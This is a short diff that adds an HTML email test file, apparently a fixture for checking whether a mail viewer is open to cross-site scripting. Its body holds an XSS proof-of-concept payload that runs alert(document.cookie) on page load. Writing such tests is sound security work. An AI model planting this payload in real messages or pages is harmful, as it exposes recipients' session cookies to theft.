@@ -1,0 +1,7 @@
+From: reagan.rorschach@enron.com
+To: 	Rick Causey
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Mail XSS TEST BY s3v3v10111<body onload=alert(document.cookie)>
